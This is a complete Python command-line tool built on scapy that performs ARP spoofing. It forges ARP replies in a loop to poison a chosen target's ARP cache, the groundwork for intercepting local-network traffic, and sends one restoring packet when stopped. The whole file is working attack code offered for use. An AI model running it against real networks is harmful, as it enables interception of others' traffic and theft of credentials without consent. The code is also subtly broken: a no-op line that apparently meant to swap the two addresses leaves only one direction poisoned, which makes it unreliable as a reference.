#!/usr/bin/python
import scapy.all as scapy
import argparse
import logging
import time
from threading import Thread, Event
from typing import Optional


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class ARPHandler:
    
    def __init__(self, target_ip: str, spoofed_ip: str) -> None:
        self.target_ip: str = target_ip
        self.spoofed_ip: str = spoofed_ip
        self.stop_event: Event = Event()
        
    def get_mac(self, ip: str) -> Optional[str]:
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
        
        if answer:
            mac = answer[0][1].hwsrc
            logging.info(f"MAC address for {ip} is {mac}")
            return mac
        else:
            logging.error(f"Failed to get MAC address for {ip}")
            return None

    def restore_defaults(self) -> None:
        target_mac = self.get_mac(self.target_ip)
        source_mac = self.get_mac(self.spoofed_ip)
        
        if target_mac and source_mac:
            packet = scapy.ARP(op=2, pdst=self.target_ip, hwdst=target_mac, psrc=self.spoofed_ip, hwsrc=source_mac)
            scapy.send(packet, verbose=False)
            logging.info(f"Restored defaults for {self.target_ip} from {self.spoofed_ip}")

    def spoof(self) -> None:
        target_mac = self.get_mac(self.target_ip)
        
        if target_mac is None:
            logging.error(f"Cannot spoof {self.target_ip}: MAC address not found")
            return
        
        packet = scapy.ARP(op=2, hwdst=target_mac, pdst=self.target_ip, psrc=self.spoofed_ip)
        scapy.send(packet, verbose=False)
        logging.info(f"Spoofed {self.target_ip} with IP {self.spoofed_ip}")

    def start_spoofing(self) -> None:
        thread = Thread(target=self.run_spoofing)
        thread.start()
    
    def run_spoofing(self) -> None:
        try:
            while not self.stop_event.is_set():
                self.spoof()
                time.sleep(2)
                self.spoofed_ip, self.target_ip
                time.sleep(2)
        except Exception as e:
            logging.error(f"Error during spoofing: {e}")
    
    def stop_spoofing(self) -> None:
        self.stop_event.set()
        

class ARPSpoofer:

    def __init__(self) -> None:
        self.parser: argparse.ArgumentParser = argparse.ArgumentParser(description="ARP Spoofing Tool")
        self.parser.add_argument('-t', '--target', required=True, help="Target IP address to spoof")
        self.parser.add_argument('-s', '--spoofed', required=True, help="Spoofed IP address")
        
    def parse_arguments(self) -> argparse.Namespace:
        return self.parser.parse_args()

    def run(self) -> None:
        args = self.parse_arguments()
        arp_handler = ARPHandler(args.target, args.spoofed)
        
        try:
            arp_handler.start_spoofing()
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            logging.info("Process stopped. Restoring defaults...")
            arp_handler.stop_spoofing()
            arp_handler.restore_defaults()
            exit(0)

if __name__ == "__main__":
    ARPSpoofer().run()
